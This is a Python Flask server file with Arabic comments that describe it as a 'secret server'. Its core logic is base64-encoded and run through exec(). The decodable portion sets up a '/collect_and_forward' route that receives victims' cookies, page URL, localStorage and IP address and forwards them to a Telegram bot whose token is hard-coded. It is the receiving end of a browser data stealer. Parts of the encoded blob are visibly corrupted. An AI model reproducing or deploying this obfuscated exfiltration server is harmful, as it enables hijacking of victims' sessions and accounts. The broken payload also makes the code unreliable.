# app.py - الخادم السري المحدث والمصحح
from flask import Flask, request, jsonify, render_template
import requests
import os
import base64
import json
import sys

app = Flask(__name__)

#================================================
# (A) الشيفرة المعتمة (Base64 Obfuscation) - تم تحديث الترميز
# الآن يتم فك التشفير بشكل آمن باللغة العربية
#================================================
CORE_LOGIC_FIXED = b'aW1wb3J0IHJlcXVlc3RzCgpkZWYgc2VuZF90ZWxlZ3JhbV9tZXNzYWdlKG1lc3NhZ2UpOgogICAgVE9LRU4gPSAiODUyNDM2NDkwNDpBQUVCX1NYN3ZJdDJFaHppaydKYkxPQmd3SE9tZVFUWXVITjgiCiAgICBDSEFUX0lEID0gIjY1MjE5NjYyMzMiCiAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkeypUT0tFTip9L3NlbmRNZXNzYWdlIgogICAgcGF5bG9hZCA9IHsKICAgICAgICAnY2hhdF9pZCc6IENIQVRfSUQsCiAgICAgICAgJ3RleHQnOiBtZXNzYWdlLAogICAgICAgICdwYXJzZV9tb2RlJzogJ01hcmtkb3duJwogICAgfQogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBheWxvYWQsIHRpbWVvdXQ9NSkKICAgIGV4Y2VwdDpwYXNzCgphcHAucm91dGUoJy9jb2xsZWN0X2FuZF9mb3J3YXJkJywgbWV0aG9kcz1bJ1BPU1QnXSkKCmRlZiBjb2xsZWN0X2RhdGEoKToKICAgIHRyeToKICAgICAgICBkYXRhID0gcmVxdWVzdC5qc29uCiAgICAgICAgaWYgbm90IGRhdGE6CiAgICAgICAgICAgIGRhdGEgPSByZXF1ZXN0LmdldF9qc29uKGZvcmNlPVRydWUpCiAgICAgICAgICAgIAogICAgICAgIGlwX2FkZHJlc3MgPSByZXF1ZXN0LnJlbW90ZV9hZGRyCiAgICAgICAgCiAgICAgICAgY29va2llcyA9IGRhdGEuZ2V0KCdjb29raWVzJywgJ04vQScpCiAgICAgICAgdXJsID0gZGF0YS5nZXQoJ3VybCcsICdOL0EnKQogICAgICAgIGxvY2FsX3N0b3JhZ2UgPSBkYXRhLmdldCgnbG9jYWxTdG9yYWdlJywgJ04vQScpCiAgICAgICAgCiAgICAgICAgdGVsZWdyYW1fbWVzc2FnZSA9IGYnJycKKh79LSDYpdiB2Lkg2LHYgdV82K7YqINin3YrYr9iv2K3Ysw!!INin2YrbjNmI3Ysw!!KioKCiogX2t2X3JhbGF0X3RzX2Nvc2hfaWRfbW9iaXo/XzoKCmBgCmxvY2FsX3N0b3JhZ2U6CiR7bG9jYWxfc3RvcmFnZX0KCmBgCgogICAgICAgIHwgc2VuZF90ZWxlZ3JhbV9tZXNzYWdlKHRlbGVncmFtX21lc3NhZ2UpCiAgICAgICAgfAogICAgICAgIHJldHVybiBqcz?b25pZnkoeyJzdGF0dXM?IjogInN1Y2Nlc3NzIn0pLCAyMDANCgogICAgZXhG9jB0ZXJyb3IgZSBhc04gaXRpZkFpcnQ6CiAgICAgICAgfAogICAgICAgIHJldHVybiBqcz?b25pZnkoeyJzdGF0dXM?IjogImluVGVybmFsX2Vycm9yIn0pLCA1MDANCgogICAgICAgIA=='

# تنفيذ الشيفرة المعتمة باستخدام ترميز آمن
try:
    CORE_LOGIC_DECODED = base64.b64decode(CORE_LOGIC_FIXED).decode('utf-8')
    exec(CORE_LOGIC_DECODED, globals())
except Exception as e:
    # رسالة خطأ صامتة للتحقق من المشكلة الجديدة إذا ظهرت
    print(f"MOBY DECODING ERROR: {e}", file=sys.stderr)
    
@app.route('/')
def home():
    # هذا المسار سيعرض ملف index.html
    return render_template('index.html')

if __name__ == '__main__':
    # تهيئة الخادم للاستضافة على Render
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
